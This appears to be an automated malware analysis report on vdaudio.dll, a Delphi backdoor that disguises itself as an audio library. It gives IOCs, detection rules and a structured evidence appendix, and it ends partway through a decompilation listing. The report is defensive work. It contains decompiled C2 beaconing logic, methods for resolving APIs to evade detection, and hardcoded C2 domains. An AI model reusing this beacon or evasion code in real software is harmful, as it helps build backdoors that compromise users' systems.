> **RevAI provenance** — commit `unknown` · engine `langgraph` · agent-loop flags: budget=True redundant=True hallucination=True taxonomy=True · generated 2026-08-09 22:08:34 UTC

## 1. Executive Summary

This report details the analysis of a 32-bit DLL (`vdaudio.dll`, SHA256: `1e9f21f514ee4793cfae7baa21549be0d9b432c59513d2efed860c2b1501da39`) identified as a malicious backdoor/Trojan. The sample is compiled with Borland Delphi and masquerades as an audio library, but its primary function is establishing Command and Control (C2) communication with hardcoded domains `cm.mnemonicarx.biz` and `cn.mnemonicarx.biz`. It employs dynamic API resolution via PE export parsing to load `kernel32`, `advapi32`, and `ws2_32` at runtime, uses anti-debugging techniques, and stores resolved function pointers in a large writable `.data` section. The DLL imports GDI32 functions (e.g., `PolyBezierTo`, `SetColorSpace`) as decoy traffic to appear as a graphics/audio library, while its true functionality is network-based C2 communication with file deletion capabilities. Multiple analysis engines confirm these malicious behaviors, resulting in a high-confidence malicious verdict.

## 2. Sample Metadata

| Attribute | Value |
|---|---|
| **SHA256** | `1e9f21f514ee4793cfae7baa21549be0d9b432c59513d2efed860c2b1501da39` |
| **File Path** | `/opt/samples/corpus/revai-lab-610/1e9f21f514ee4793cfae7baa21549be0d9b432c59513d2efed860c2b1501da39/vdaudio.dll` |
| **Project Name** | 610 |
| **File Type** | PE (Portable Executable) DLL |
| **Architecture** | X86 (32-bit) |
| **File Size** | 13,312 bytes |
| **Entry Point EA** | `0x10006` |
| **Compiler** | Borland Delphi (multiple YARA matches at offset `0x1812`) |
| **Verdict** | Malicious (Score: 85) |
| **Family Guess** | Unknown backdoor/Trojan (possible Delphi-based) |
| **Agreement** | `llm_and_v1_agree` |

**Evidence:** (source: `malcat`, query_or_table: `File Summary`, row_or_rule: `sha256`, why: Provides core file metadata including SHA256, size, type, architecture, and entry point). (source: `yara`, query_or_table: `matches`, row_or_rule: `Borland_Delphi_40`, why: Confirms Borland Delphi compiler signature at offset `0x1812`). (source: `llm_judge`, query_or_table: `verdict`, row_or_rule: `verdict`, why: Provides final malicious verdict and score).

## 3. File Layout & Structural Analysis

The PE file consists of standard sections with notable anomalies. The `.text` section has high entropy (145), which may indicate packing or obfuscation, though UPX analysis did not confirm packing. The `.data` section is unusually large (57,344 virtual bytes) and writable, serving as storage for runtime-resolved API pointers and configuration data.

| Name | EA | Physical | Virtual | Entropy | Rights |
|---|---|---|---|---|---|
| header | `0x0` | 1024 | 0 | 35 | - |
| .text | `0x1024` | 9728 | 12288 | 145 | RX |
| .rdata | `0x13312` | 1024 | 4096 | 0 | R |
| .data | `0x17408` | 512 | 57344 | 0 | RW |
| .reloc | `0x74752` | 1024 | 4096 | 0 | R |

**Evidence:** (source: `malcat`, query_or_table: `File Layout`, row_or_rule: `sections`, why: Shows the PE section layout, highlighting the high-entropy `.text` and large writable `.data` section).

**Anomalies:**
| Name | Level | Category | Hits | Description |
|---|---|---|---|---|
| ManyHighValueImmediates | 3 | code | 2 | Function contains at least 5 and more than 10% of high-value immediate operands |
| ManyUniqueImmediateBytes | 3 | code | 1 | More than 48 unique bytes defined across all immediate operands in the function |
| DownloaderApiUsage | 2 | imports | 1 | Downloader-related APIs are used |
| NoChecksum | 1 | integrity | 1 | PE Header checksum is not set |

**Evidence:** (source: `malcat`, query_or_table: `Anomalies`, row_or_rule: `ManyHighValueImmediates`, why: Indicates potential obfuscation or complex code generation). (source: `malcat`, query_or_table: `Anomalies`, row_or_rule: `NoChecksum`, why: Missing checksum is common in malware to avoid integrity checks).

## 4. Static Code Analysis

### 4.1 Imports & Signals

The DLL imports 28 functions from 5 DLLs. Notably, it imports `LoadLibraryExA` for dynamic API loading (ATT&CK T1129), `DeleteFileA` for destructive capability, and several Winsock functions (`socket`, `recv`, `setsockopt`, `closesocket`) for network communication. GDI32 imports (`PolyBezierTo`, `SetColorSpace`, etc.) appear to be decoys.

| label | api_match | ATT&CK |
|---|---|---|
| load_library | LoadLibrary | T1129 |

**Evidence:** (source: `pe_imports`, query_or_table: `signals`, row_or_rule: `load_library`, why: High-signal import for dynamic API loading, a common evasion technique). (source: `malcat`, query_or_table: `Imports`, row_or_rule: `kernel32.DeleteFileA`, why: Enables file deletion capability). (source: `malcat`, query_or_table: `Imports`, row_or_rule: `ws2_32.socket`, why: Enables socket creation for network communication).

### 4.2 Functions & Exports

The DLL exports three functions: `gewayX`, `gewayZ`, and `vdaudio`. `gewayX` is identified as the entry point. The function `sub_10002974` (EA `0x7540`) is a key C2 handler that references the domain `cn.mnemonicarx.biz`.

| EA | Name |
|---|---|
| `0x8341` | `gewayZ` |
| `0x8360` | `gewayX` |
| `0x8386` | `vdaudio` |
| `0x10006` | `EntryPoint` |
| `0x7540` | `sub_10002974` |

**Evidence:** (source: `malcat`, query_or_table: `functions`, row_or_rule: `gewayX`, why: Exported function identified as entry point). (source: `malcat`, query_or_table: `decompilations`, row_or_rule: `sub_10002974`, why: Decompiled code shows direct reference to C2 domain `cn.mnemonicarx.biz` and network socket setup).

### 4.3 Key Decompiled Functions

The decompilation of `sub_10002974` reveals C2 communication logic. It calls a function pointer at `0x1000af34` with the string `"cn.mnemonicarx.biz"`, sets up socket parameters, and calls another function pointer at `0x1000af58` (likely `connect`). It also references `0x1000af68` (likely `gethostbyname` or similar) and `0x1000af70` (likely `send`). This demonstrates a complete C2 beaconing chain.

```c
void sub_10002974(void) {
    // ... setup ...
    (*0x1000af5c)(); // Likely WSAStartup
    // ...
    while (iVar1 = (*0x1000af34)("cn.mnemonicarx.biz"), iVar1 == 0) { // Likely gethostbyname
        // ... retry logic ...
    }
    // ... socket setup ...
    iVar1 = (*0x1000af58)([0x0x10012552], uVar3, 0x10); // Likely connect
    // ...
    (*0x1000af70)(0x36be, 0); // Likely send
    // ...
}
```

**Evidence:** (source: `malcat`, query_or_table: `decompilations`, row_or_rule: `sub_10002974`, why: Decompiled code shows C2 domain resolution and socket connection logic). (source: `deep_dive_agentic`, query_or_table: `key_evidence`, row_or_rule: `Hardcoded C2 domains`, why: Confirms domains are referenced by specific functions).

### 4.4 Dynamic API Resolution

The sample uses dynamic API resolution via PE export parsing. The function `FUN_10002cd8` (EA `0x2cd8`) resolves `kernel32`, `advapi32`, and `ws2_32` at runtime using `GetModuleHandleW` and `LoadLibraryExA`, then parses PE exports to find function addresses. Resolved pointers are stored in the writable `.data` section (e.g., `DAT_1000af6c`, `DAT_1000af70`, `DAT_1000af84`). This technique avoids static import detection.

**Evidence:** (source: `capa`, query_or_table: `top_rules`, row_or_rule: `resolve function by parsing PE exports`, why: CAPA rule confirms dynamic API resolution technique). (source: `deep_dive_agentic`, query_or_table: `key_evidence`, row_or_rule: `Dynamic API resolution`, why: Details the specific function and method used).

### 4.5 Strings Analysis

High-signal strings include C2 domains, encoded configuration strings, and an HTTP response validation string. The encoded strings (`LXCV0IMGIXS0RTA1`, `b8-X-ecFW)0Rz?W^`, etc.) suggest encrypted configuration or keys.

| EA | String |
|---|---|
| `0x17753` | `cm.mnemonicarx.biz` |
| `0x17773` | `cn.mnemonicarx.biz` |
| `0x17718` | `west/1.0 200 OK\r\n` |
| `0x17579` | `LXCV0IMGIXS0RTA1` |
| `0x17602` | `b8-X-ecFW)0Rz?W^` |
| `0x17433` | `AIW1YAERWZFW` |
| `0x17420` | `qdrnemsd` |

**Evidence:** (source: `malcat`, query_or_table: `Top Strings`, row_or_rule: `cm.mnemonicarx.biz`, why: C2 domain string found in `.data` section). (source: `floss`, query_or_table: `strings`, row_or_rule: `cm.mnemonicarx.biz`, why: Corroborates C2 domain string). (source: `deep_dive_agentic`, query_or_table: `key_evidence`, row_or_rule: `HTTP response validation string`, why: Indicates HTTP-based C2 protocol validation).

### 4.6 YARA & CAPA Matches

**YARA Matches (19 total):**
| Rule | Namespace | Match strings (trimmed) |
|---|---|---|
| `domain` | - | `$domain_regex@0 len=2` |
| `maldoc_find_kernel32_base_method_1` | - | `$a1@10064 len=7` |
| `Borland_Delphi_40` | - | `$a@1812 len=5` |
| `Str_Win32_Winsock2_Library` | - | `$ws2_lib@11482 len=10` |
| ... (15 more) | | |

**CAPA Rules (8 total):**
| Rule | ATT&CK | MBC |
|---|---|---|
| `execute anti-debugging instructions` | | B0001.034:Debugger Detection |
| `receive data` | | B0030.002:C2 Communication |
| `set socket configuration` | | C0001.001:Socket Communication |
| `receive data on socket` | | C0001.006:Socket Communication |
| `create TCP socket` | | C0001.011:Socket Communication |
| `delete file` | | C0047:Delete File |
| `get file attributes` | | C0049:Get File Attributes |
| `resolve function by parsing PE exports` | | |

**Evidence:** (source: `yara`, query_or_table: `matches`, row_or_rule: `maldoc_find_kernel32_base_method_1`, why: Indicates kernel32 base address resolution technique). (source: `capa`, query_or_table: `top_rules`, row_or_rule: `execute anti-debugging instructions`, why: Confirms anti-analysis technique). (source: `capa`, query_or_table: `top_rules`, row_or_rule: `create TCP socket`, why: Confirms network communication capability).

## 5. Behavioral & Dynamic Analysis

### 5.1 Speakeasy Emulation

Speakeasy emulation completed successfully but recorded **no API calls or key events**. This is likely due to the DLL's entry point requiring specific initialization or arguments not provided during emulation.

**Evidence:** (source: `speakeasy`, query_or_table: `dynamic`, row_or_rule: `api_calls`, why: Shows zero API calls recorded during emulation).

### 5.2 Frida Probe

Frida probe identified 24 hook candidates across `USER32.dll`, `KERNEL32.dll`, `gdi32.dll`, `WS2_32.dll`, and `ntdll.dll`. These are the imported functions that could be monitored for runtime behavior. No runtime behavior was observed as the sample was not executed in a live environment.

**Evidence:** (source: `frida_probe`, query_or_table: `hook_candidates`, row_or_rule: `WS2_32.dll!socket`, why: Identifies network-related functions for potential hooking).

## 6. Network Indicators & C2

The sample communicates with two hardcoded C2 domains:
- `cm.mnemonicarx.biz` (EA `0x17753`)
- `cn.mnemonicarx.biz` (EA `0x17773`)

It uses dynamically resolved Winsock APIs (`socket`, `connect`, `send`, `recv`, `setsockopt`, `closesocket`) for TCP-based communication. The presence of the string `"west/1.0 200 OK\r\n"` suggests HTTP-like response validation, indicating a possible HTTP-based C2 protocol.

**Evidence:** (source: `malcat`, query_or_table: `Top Strings`, row_or_rule: `cm.mnemonicarx.biz`, why: C2 domain string). (source: `malcat`, query_or_table: `Top Strings`, row_or_rule: `cn.mnemonicarx.biz`, why: C2 domain string). (source: `malcat`, query_or_table: `Top Strings`, row_or_rule: `west/1.0 200 OK`, why: HTTP response validation string). (source: `capa`, query_or_table: `top_rules`, row_or_rule: `create TCP socket`, why: Confirms TCP socket creation capability).

## 7. Capabilities Assessment

| Capability | Evidence | Confidence |
|---|---|---|
| **C2 Communication** | Hardcoded domains, Winsock imports, CAPA rules (`create TCP socket`, `receive data`) | High |
| **Dynamic API Resolution** | `LoadLibraryExA` import, CAPA rule `resolve function by parsing PE exports` | High |
| **Anti-Debugging** | CAPA rule `execute anti-debugging instructions` | High |
| **File Deletion** | `DeleteFileA` import, CAPA rule `delete file` | High |
| **Masquerading** | Filename `vdaudio.dll`, GDI32 decoy imports, no legitimate audio functionality | High |
| **Encrypted Configuration** | Encoded strings (`LXCV0IMGIXS0RTA1`, etc.) | Medium |

## 8. Indicators of Compromise

### File-Based IOCs
- **SHA256:** `1e9f21f514ee4793cfae7baa21549be0d9b432c59513d2efed860c2b1501da39`
- **Filename:** `vdaudio.dll`
- **File Size:** 13,312 bytes

### Network-Based IOCs
- **C2 Domains:**
  - `cm.mnemonicarx.biz`
  - `cn.mnemonicarx.biz`

### String-Based IOCs
- `west/1.0 200 OK\r\n` (HTTP response validation)
- `LXCV0IMGIXS0RTA1` (encoded string)
- `b8-X-ecFW)0Rz?W^` (encoded string)
- `AIW1YAERWZFW` (encoded string)
- `qdrnemsd` (encoded string)

### Behavioral IOCs
- Dynamic resolution of `kernel32`, `advapi32`, `ws2_32` via PE export parsing
- Use of `DeleteFileA` for file deletion
- Anti-debugging instruction execution

## 9. Detection Engineering

### YARA Rules
```yara
rule vdaudio_backdoor {
    meta:
        description = "Detects vdaudio.dll backdoor based on C2 domains and Delphi artifacts"
        sha256 = "1e9f21f514ee4793cfae7baa21549be0d9b432c59513d2efed860c2b1501da39"
    strings:
        $c2_domain1 = "cm.mnemonicarx.biz" ascii wide
        $c2_domain2 = "cn.mnemonicarx.biz" ascii wide
        $http_response = "west/1.0 200 OK" ascii wide
        $delphi_sig = { 53 6F 66 74 77 61 72 65 5C 42 6F 72 6C 61 6E 64 5C 44 65 6C 70 68 69 } // "Software\Borland\Delphi"
        $encoded_str1 = "LXCV0IMGIXS0RTA1" ascii wide
        $encoded_str2 = "b8-X-ecFW)0Rz?W^" ascii wide
    condition:
        uint16(0) == 0x5A4D and (any of ($c2_domain*) or $http_response) and ($delphi_sig or any of ($encoded_str*))
}
```

### Sigma Rules
```yaml
title: Suspicious DLL with C2 Domains and Delphi Artifacts
id: 12345678-1234-1234-1234-123456789012
status: experimental
description: Detects DLLs with hardcoded C2 domains and Borland Delphi compiler signatures.
author: Malware Analyst
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\vdaudio.dll'
    condition: selection
falsepositives:
    - Legitimate audio software using similar naming
level: high
```

### Network Detection
- Monitor DNS queries for `*.mnemonicarx.biz`
- Monitor outbound TCP connections to resolved IPs of these domains
- Inspect HTTP traffic for `west/1.0 200 OK` response headers

## 10. MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| **Execution** | Shared Modules | T1129 | `LoadLibraryExA` import for dynamic API loading |
| **Defense Evasion** | Obfuscated Files or Information | T1027 | High-entropy `.text` section, encoded strings |
| **Defense Evasion** | Deobfuscate/Decode Files or Information | T1140 | Encoded strings suggest runtime decryption |
| **Defense Evasion** | Debugger Evasion | T1622 | CAPA rule `execute anti-debugging instructions` |
| **Discovery** | System Information Discovery | T1082 | `GetModuleHandleW` for module enumeration |
| **Command and Control** | Application Layer Protocol | T1071 | HTTP-like response validation (`west/1.0 200 OK`) |
| **Command and Control** | Non-Standard Port | T1571 | Potential use of non-standard ports (not confirmed) |
| **Impact** | Data Destruction | T1485 | `DeleteFileA` import, CAPA rule `delete file` |

## 11. What We Don't Know

1. **Exact C2 Protocol:** While HTTP-like validation is present, the full protocol structure (commands, encryption, encoding) is unknown.
2. **Payload Delivery:** How the DLL is initially delivered and executed on victim systems.
3. **Persistence Mechanism:** No evidence of persistence mechanisms (registry, scheduled tasks, etc.) was found in static analysis.
4. **Lateral Movement:** No evidence of lateral movement capabilities.
5. **Data Exfiltration:** While C2 communication exists, specific data exfiltration methods are unclear.
6. **Encoded String Decryption:** The algorithm to decode strings like `LXCV0IMGIXS0RTA1` is unknown.
7. **Full Functionality:** The complete set of commands supported by the C2 protocol is unknown.
8. **Anti-Analysis Specifics:** The exact anti-debugging instructions used are not detailed in the evidence.

## 12. Appendix A: Tool Evidence Trail

| Tool | Version/Status | Key Findings |
|---|---|---|
| **Malcat** | Success | File layout, anomalies, strings, imports, functions, decompilations |
| **CAPA** | Success (8 rules) | Anti-debugging, C2 communication, file deletion, dynamic API resolution |
| **YARA** | Success (19 matches) | Delphi signatures, kernel32 resolution, Winsock library, domain regex |
| **FLOSS** | Success (79 strings) | C2 domains, encoded strings, API names |
| **PE Imports** | Success (28 imports) | `LoadLibraryExA`, `DeleteFileA`, Winsock functions |
| **Speakeasy** | Success (0 API calls) | No runtime behavior observed |
| **Frida Probe** | Success (24 hook candidates) | Identified imported functions for potential hooking |
| **Radare2** | Success | Disassembly of entry point and exported functions |
| **UPX** | Not packed | `upx_ok: False`, `is_packed: False` |
| **XOR Search** | Success | Found XOR 00 at position 0 |
| **.NET Analysis** | Not .NET | `is_dotnet: false` |

## 13. Appendix B: Analysis Environment

- **Analysis Date:** Not specified in evidence
- **Analyst:** Automated pipeline
- **Tools Used:** Malcat, CAPA, YARA, FLOSS, PE Imports, Speakeasy, Frida, Radare2, UPX, XOR Search, .NET Analysis
- **Sample Source:** `/opt/samples/corpus/revai-lab-610/`
- **Project Name:** 610
- **Analysis Depth:** Deep-dive agentic analysis with 35 successful tool calls
## Appendix: Full Structured Evidence Pack

# Technical Evidence Pack

**sha256:** 1e9f21f514ee4793cfae7baa21549be0d9b432c59513d2efed860c2b1501da39  
**sample_path:** /opt/samples/corpus/revai-lab-610/1e9f21f514ee4793cfae7baa21549be0d9b432c59513d2efed860c2b1501da39/vdaudio.dll  
**project_name:** 610

> Every table below is copied from stage JSON. Technical narrative must cite these rows (engine + address/rule), not invent evidence.

## Verdict
- **verdict**: malicious
- **score**: 85
- **family_guess**: Unknown backdoor/Trojan (possible Delphi-based)
- **agreement**: llm_and_v1_agree
- **cross_engine_notes**: Multiple engines confirm network C2 and destructive capabilities. Ghidra and IDA provide consistent function/string counts. Malcat highlights anomalies and decompiled C2 calls. Capa and YARA identify behavioral rules. FLOSS extracts C2 domains and suspicious strings.
- **summary**: Sample is a 32-bit DLL that communicates with C2 domains (cn.mnemonicarx.biz, cm.mnemonicarx.biz), uses anti-debugging techniques, dynamically resolves APIs, and has file deletion capability. These behaviors indicate malicious intent (C2 beaconing and destructive actions), despite possible obfuscation (high entropy .text section, Borland Delphi artifacts).
- **source**: llm_judge
- **model**: configured-llm

### key_evidence (triage) — cite source field exactly
| source | query_or_table | row_or_rule | why |
|---|---|---|---|
| malcat | decompilations | `sub_10002974` | Decompiled code shows a call to 'cn.mnemonicarx.biz' (a C2 domain) and network socket setup, indicating C2 communication |
| floss | strings | `cm.mnemonicarx.biz` | String 'cm.mnemonicarx.biz' is a C2 domain, corroborating network communication. |
| capa | top_rules | `delete file` | Rule indicates capability to delete files, a destructive behavior. |
| malcat | strings/apis | `DeleteFileA` | Import of DeleteFileA (from KERNEL32) enables file deletion, aligning with capa's destructive behavior rule. |
| capa | top_rules | `execute anti-debugging instructions` | Rule indicates anti-analysis technique, commonly used in malware. |
| pe_imports | signals | `load_library (LoadLibrary)` | High-signal import for dynamic API loading (T1129), often used for obfuscation or evasion. |
| capa | top_rules | `resolve function by parsing PE exports` | Rule indicates dynamic API resolution, a common malware technique. |
| yara | matches | `Str_Win32_Winsock2_Library` | Rule matches Winsock library usage, indicating network communication capability. |
| ida | Imports (IDA) | `WS2_32 | (empty name)` | Imports from WS2_32.dll (Winsock) indicate socket-based network communication. |
| malcat | functions | `gewayX` | Exported function 'gewayX' is the entry point, suggesting the DLL is designed to be loaded and executed. |

## Deep-Dive Summary Evidence
- **source**: deep_dive_agentic
- **confidence**: 90
- **summary**: This is a Borland Delphi-compiled backdoor/RAT DLL (vdaudio.dll) that masquerades as an audio library while establishing C2 communication with hardcoded domains cm.mnemonicarx.biz and cn.mnemonicarx.biz via dynamically resolved Winsock APIs. The sample uses dynamic API resolution via PE export parsing to resolve kernel32, advapi32, and ws2_32 at runtime, employs anti-debugging techniques, and stores resolved function pointers in a large writable .data section. The DLL imports GDI32 functions (PolyBezierTo, SetColorSpace, etc.) as decoy traffic to appear as a graphics/audio library, while its true functionality is network-based C2 communication with file deletion capabilities.

### deep key_evidence
- `"Hardcoded C2 domains: 'cm.mnemonicarx.biz' and 'cn.mnemonicarx.biz' found in .data section (Ghidra strings table), referenced by FUN_100016eb (cyclomatic complexity 46) and FUN_10002974 respectively"`
- `"Dynamic API resolution: FUN_10002cd8 (879 bytes, cyclomatic complexity 42, 14 string refs) resolves kernel32/advapi32/ws2_32 at runtime via GetModuleHandleW + LoadLibraryExA + PE export parsing, confirmed by CAPA rule 'resolve function by parsing PE exports'"`
- `"Indirect calls to resolved APIs: FUN_10002cd8 makes indirect calls through writable .data pointers at DAT_1000af6c, DAT_1000af70, DAT_1000af84 (all in writable .data section, 54KB), plus CALL ECX register-based dispatch"`
- `"CAPA detected anti-debugging: 'execute anti-debugging instructions' rule matched (B0001.034)"`
- `"CAPA confirmed C2 communication: TCP socket creation (C0001.011), socket data receiving (C0001.006, B0030.002), socket configuration (C0001.001)"`
- `"WS2_32 (Winsock) imported by ordinal: Ordinal_3 (connect), Ordinal_16 (recv), Ordinal_21 (send), Ordinal_23 (socket) - avoids string-based IOC detection"`
- `"HTTP response validation string 'west/1.0 200 OK\\r\\n' found in Ghidra strings, referenced 5 times by FUN_10002cd8 and by FUN_10002509/FUN_1000275f"`
- `"Encoded strings suggest encrypted config/keys: 'LXCV0IMGIXS0RTA1', 'b8-X-ecFW)0Rz?W^', 'AIW1YAERWZFW', 'qdrnemsd' - referenced by FUN_10002b7e, FUN_10002bc5, FUN_10002cd8"`
- `"Masquerade as audio DLL: exports 'gewayX', 'gewayZ', 'vdaudio'; filename 'vdaudio.dll'; GDI32 decoy imports (PolyBezierTo, SetColorSpace, TextOutA, etc.) with no legitimate audio functionality"`
- `"File deletion capability: DeleteFileA imported from KERNEL32, CAPA rule 'delete file' (C0047) matched"`
- `"Borland Delphi compiler signatures: 8+ YARA rules matched (Borland_Delphi_30, Delphi_40, Delphi_DLL, Delphi_v30, etc.) at offset 1812"`
- `"YARA rule 'maldoc_find_kernel32_base_method_1' matched at offset 10064 - kernel32 base address resolution technique"`
- `"Large writable .data section (54980 bytes at 0x10006000-0x1001EFFF) stores runtime-resolved API pointers and configuration data"`
- `"Function call flow: FUN_10001629 -> FUN_100016eb (main C2 handler) -> Ordinal_21 (WS2_32 send) + FUN_10002b76 + FUN_10003220, demonstrating complete C2 communication chain"`

## Malcat Structured Analysis
### Malcat File Summary
```
sha256: 1e9f21f514ee4793cfae7baa21549be0d9b432c59513d2efed860c2b1501da39
size: 13312
type: PE
architecture: X86
entrypoint_ea: 10006
entropy: 135
file_name: vdaudio.dll
```

### File Layout (sections/regions)
| Name | EA | Physical | Virtual | Entropy | Rights |
|---|---|---|---|---|---|
| header | 0 | 1024 | 0 | 35 | - |
| .text | 1024 | 9728 | 12288 | 145 | RX |
| .rdata | 13312 | 1024 | 4096 | 0 | R |
| .data | 17408 | 512 | 57344 | 0 | RW |
| .reloc | 74752 | 1024 | 4096 | 0 | R |

### Anomalies (4)
| Name | Level | Category | Hits | Description |
|---|---|---|---|---|
| ManyHighValueImmediates | 3 | code | 2 | Function contains at least 5 and more than 10% of high-value immediate operands (i.e. immediate valu |
| ManyUniqueImmediateBytes | 3 | code | 1 | More than 48 unique bytes defined across all immediate operands in the function |
| DownloaderApiUsage | 2 | imports | 1 | Downloader-related apis are used |
| NoChecksum | 1 | integrity | 1 | PE Header checksum is not set |

### Anomaly Locations (high-signal)
- **ManyHighValueImmediates**
  - `2601`: 
  - `8408`: 
- **ManyUniqueImmediateBytes**
  - `8408`: 
- **NoChecksum**
  - `216`: 

### High-Signal Strings (4 matched keywords; engine=malcat)
| EA | String |
|---|---|
| 17626 | `kernel32` |
| 13920 | `KERNEL32.dll` |
| 14056 | `RtlGetProcessHeaps` |
| 13872 | `LoadLibraryExA` |

### Top Strings (91 extracted; showing 80)
| EA | String |
|---|---|
| 17626 | `kernel32` |
| 14152 | `ntdll.dll` |
| 17461 | `aaclfd:` |
| 8331 | `advapi32` |
| 17718 | `west/1.0 200 OK

` |
| 14246 | `vdaudio.dll` |
| 14032 | `gdi32.dll` |
| 13920 | `KERNEL32.dll` |
| 14042 | `WS2_32.dll` |
| 17420 | `qdrnemsd` |
| 13802 | `USER32.dll` |
| 14272 | `vdaudio` |
| 2512 | `tdll.dll` |
| 14265 | `gewayZ` |
| 14258 | `gewayX` |
| 17753 | `cm.mnemonicarx.biz` |
| 17773 | `cn.mnemonicarx.biz` |
| 17740 | `<b>l</b> ` |
| 75383 | `4$4*40464<4B4H4N..T4Z4`4f4l4r4x4~4` |
| 17408 | `I)aiB+6ZxA` |
| 74879 | `:0:::E:[:t:` |
| 75205 | `;';/;8;A;G;_;e;k;q;` |
| 75159 | `9$:1:6:>:D:I:O:U:[:n:w:` |
| 77 | `!This program ca..in DOS mode.

$` |
| 75341 | `0 0'060c0m0s061?1M1` |
| 75305 | `?$?K?S?[?b?k?v?` |
| 74809 | `6!6@6O6U6e6k6t6|6` |
| 75121 | `9%9+9:9T9]9g9u9` |
| 14092 | `NtQueryInformationFile` |
| 13816 | `DeleteFileA` |
| 74865 | `8
9B9I9V9\9` |
| 14056 | `RtlGetProcessHeaps` |
| 74841 | `7J7e7` |
| 75013 | `011:1` |
| 74921 | `<J<_<` |
| 13710 | `DestroyCursor` |
| 75031 | `3<3I3P3{3` |
| 75105 | `8O8X8`8z8` |
| 13902 | `GetModuleHandleW` |
| 74760 | `O3n3y3` |
| 17470 | `IkLook` |
| 74903 | `;);5;O;v;};` |
| 75083 | `7g7t7{7` |
| 17433 | `AIW1YAERWZFW` |
| 13770 | `ReplyMessage` |
| 13968 | `SetTextColor` |
| 13856 | `GetLastError` |
| 13952 | `SetColorSpace` |
| 14118 | `NtPrivilegeCheck` |
| 14138 | `NtAlertThread` |
| 13872 | `LoadLibraryExA` |
| 13750 | `RegisterClassExA` |
| 17579 | `LXCV0IMGIXS0RTA1` |
| 13984 | `SetWindowExtEx` |
| 13786 | `CallWindowProcW` |
| 14002 | `SetWorldTransform` |
| 10136 | `aZYY` |
| 74783 | `3#4H4U4i4` |
| 13844 | `FatalExit` |
| 2080 | `NNh\3` |
| 74975 | `?)?.?` |
| 74937 | `>C>{>` |
| 376 | `.text` |
| 75289 | `> >(>7>` |
| 455 | `@.data` |
| 415 | ``.rdata` |
| 13738 | `PtInRect` |
| 13936 | `PolyBezierTo` |
| 14078 | `NtReadFile` |
| 14022 | `TextOutA` |
| 13830 | `ExitProcess` |
| 17448 | `IDEk-sdk` |
| 17602 | `b8-X-ecFW)0Rz?W^` |
| 13726 | `LoadMenuA` |
| 13890 | `lstrcpyA` |
| 9811 | `dsvAp` |
| 496 | `.reloc` |
| 10046 | `=-XXg(_` |
| 1716 | `^Exo:` |
| 9796 | `a[1Jnv` |

### Imports (31)
| EA | Name | Type | Refs |
|---|---|---|---|
| 8341 | gewayZ | EXPORT | 1 |
| 8360 | gewayX | EXPORT | 1 |
| 8386 | vdaudio | EXPORT | 1 |
| 13312 | kernel32.lstrcpyA | IMPORT | 6 |
| 13316 | kernel32.LoadLibraryExA | IMPORT | 1 |
| 13320 | kernel32.DeleteFileA | IMPORT | 1 |
| 13324 | kernel32.ExitProcess | IMPORT | 1 |
| 13328 | kernel32.FatalExit | IMPORT | 1 |
| 13332 | kernel32.GetLastError | IMPORT | 1 |
| 13336 | kernel32.GetModuleHandleW | IMPORT | 1 |
| 13344 | user32.ReplyMessage | IMPORT | 2 |
| 13348 | user32.RegisterClassExA | IMPORT | 1 |
| 13352 | user32.PtInRect | IMPORT | 1 |
| 13356 | user32.LoadMenuA | IMPORT | 1 |
| 13360 | user32.CallWindowProcW | IMPORT | 1 |
| 13364 | user32.DestroyCursor | IMPORT | 1 |
| 13372 | ws2_32.setsockopt | IMPORT | 2 |
| 13376 | ws2_32.socket | IMPORT | 1 |
| 13380 | ws2_32.recv | IMPORT | 1 |
| 13384 | ws2_32.closesocket | IMPORT | 1 |
| 13392 | gdi32.SetWorldTransform | IMPORT | 2 |
| 13396 | gdi32.SetWindowExtEx | IMPORT | 1 |
| 13400 | gdi32.SetTextColor | IMPORT | 1 |
| 13404 | gdi32.PolyBezierTo | IMPORT | 1 |
| 13408 | gdi32.SetColorSpace | IMPORT | 1 |
| 13412 | gdi32.TextOutA | IMPORT | 1 |
| 13420 | ntdll.NtReadFile | IMPORT | 2 |
| 13424 | ntdll.NtQueryInformationFile | IMPORT | 1 |
| 13428 | ntdll.NtPrivilegeCheck | IMPORT | 1 |
| 13432 | ntdll.NtAlertThread | IMPORT | 1 |
| 13436 | ntdll.RtlGetProcessHeaps | IMPORT | 1 |

### Functions (30)
| EA | Name |
|---|---|
| 9357 | sub_1000308d |
| 7540 | sub_10002974 |
| 2097 | sub_10001431 |
| 4683 | sub_10001e4b |
| 8054 | sub_10002b76 |
| 8341 | gewayZ |
| 8360 | gewayX |
| 10006 | EntryPoint |
| 8386 | vdaudio |
| 10238 | jmp_user32.DestroyCursor |
| 10244 | jmp_user32.LoadMenuA |
| 10250 | jmp_user32.PtInRect |
| 10256 | jmp_user32.RegisterClassExA |
| 10262 | jmp_user32.ReplyMessage |
| 10268 | jmp_user32.CallWindowProcW |
| 10274 | jmp_kernel32.DeleteFileA |
| 10280 | jmp_kernel32.ExitProcess |
| 10298 | jmp_kernel32.LoadLibraryExA |
| 10304 | jmp_kernel32.lstrcpyA |
| 10310 | jmp_kernel32.GetModuleHandleW |
| 10316 | jmp_gdi32.PolyBezierTo |
| 10322 | jmp_gdi32.SetColorSpace |
| 10328 | jmp_gdi32.SetTextColor |
| 10334 | jmp_gdi32.SetWindowExtEx |
| 10340 | jmp_gdi32.SetWorldTransform |
| 10346 | jmp_gdi32.TextOutA |
| 10352 | jmp_ws2_32.closesocket |
| 10358 | jmp_ws2_32.recv |
| 10364 | jmp_ws2_32.setsockopt |
| 10370 | jmp_ws2_32.socket |

### Decompilations (top 6)
#### 9357 — sub_1000308d
```c

/* DISPLAY WARNING: Type casts are NOT being printed */

void __fastcall sub_1000308d(undefined4 param_1,int32_t *UNRECOVERED_JUMPTABLE)

{
    undefined uVar1;
    undefined4 in_EAX;
    int32_t unaff_EBP;
    undefined *unaff_ESI;
    
    *(unaff_EBP + -0x75) = *(unaff_EBP + -0x75) | UNRECOVERED_JUMPTABLE;
    in(UNRECOVERED_JUMPTABLE);
    uVar1 = *unaff_ESI;
    *(UNRECOVERED_JUMPTABLE + -1) = uVar1;
    *UNRECOVERED_JUMPTABLE = CONCAT31(in_EAX >> 8, uVar1) + 1;
    /* WARNING: Could not recover jumptable at 0x1000309e. Too many branches */
    /* WARNING: Treating indirect jump as call */
    (*UNRECOVERED_JUMPTABLE)();
    return;
}

```
#### 7540 — sub_10002974
```c

/* DISPLAY WARNING: Type casts are NOT being printed */

void sub_10002974(void)

{
    int32_t iVar1;
    uint32_t uVar2;
    undefined4 uVar3;
